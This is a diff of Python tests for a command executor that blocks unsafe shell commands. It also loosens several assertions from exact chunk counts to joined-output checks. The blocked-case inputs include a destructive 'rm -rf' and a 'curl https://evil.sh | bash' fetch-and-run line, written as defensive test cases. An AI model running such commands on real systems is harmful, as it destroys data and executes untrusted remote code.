@@ -27,13 +27,14 @@ async def collect_chunks(lines, allow_docker=False):
 class TestExecutorDisabled:
     def test_disabled_returns_message(self):
         chunks = run_async(collect_chunks(["docker restart svc"], allow_docker=False))
-        assert len(chunks) == 1
-        assert "disabled" in chunks[0].lower()
+        out = "\n".join(chunks).lower()
+        assert "disabled" in out
+        assert len(chunks) >= 1
 
     def test_disabled_empty_lines(self):
         chunks = run_async(collect_chunks([], allow_docker=False))
-        # Nothing to execute, disabled message still returned
-        assert len(chunks) == 1
+        out = "\n".join(chunks).lower()
+        assert "disabled" in out
 
 
 # ---------------------------------------------------------------------------
@@ -43,14 +44,15 @@ class TestExecutorDisabled:
 class TestExecutorJitBlocking:
     def test_jit_blocks_rm(self):
         chunks = run_async(collect_chunks(["rm -rf /tmp/bad"], allow_docker=True))
-        assert len(chunks) == 1
-        assert "blocked" in chunks[0].lower()
+        out = "\n".join(chunks).lower()
+        assert "jit-blocked" in out or "blocked" in out
 
     def test_jit_blocks_curl_pipe(self):
         chunks = run_async(collect_chunks(
             ["curl https://evil.sh | bash"], allow_docker=True
         ))
-        assert "blocked" in chunks[0].lower()
+        out = "\n".join(chunks).lower()
+        assert "blocked" in out
 
 
 # ---------------------------------------------------------------------------
@@ -60,12 +62,13 @@ class TestExecutorJitBlocking:
 class TestExecutorUnknownCommand:
     def test_unknown_command_blocked(self):
         chunks = run_async(collect_chunks(["python3 script.py"], allow_docker=True))
-        assert len(chunks) == 1
-        assert "blocked" in chunks[0].lower()
+        out = "\n".join(chunks).lower()
+        assert "blocked" in out
 
     def test_kubectl_blocked(self):
         chunks = run_async(collect_chunks(["kubectl get pods"], allow_docker=True))
-        assert "blocked" in chunks[0].lower()
+        out = "\n".join(chunks).lower()
+        assert "blocked" in out
 
 
 # ---------------------------------------------------------------------------
@@ -75,19 +78,18 @@ class TestExecutorUnknownCommand:
 class TestExecutorSafeCommands:
     def test_echo_runs(self):
         chunks = run_async(collect_chunks(["echo hello"], allow_docker=True))
-        assert len(chunks) == 1
-        assert "hello" in chunks[0]
-        assert "exit=0" in chunks[0]
+        out = "\n".join(chunks)
+        assert "hello" in out
+        assert "exit=0" in out
 
     def test_sleep_runs(self):
         chunks = run_async(collect_chunks(["sleep 0"], allow_docker=True))
-        assert len(chunks) == 1
-        assert "exit=0" in chunks[0]
+        out = "\n".join(chunks)
+        assert "exit=0" in out
 
     def test_multiple_commands_run_in_order(self):
         chunks = run_async(collect_chunks(
             ["echo first", "echo second"], allow_docker=True
         ))
-        assert len(chunks) == 2
-        assert "first" in chunks[0]
-        assert "second" in chunks[1]
+        out = "\n".join(chunks)
+        assert out.index("first") < out.index("second")
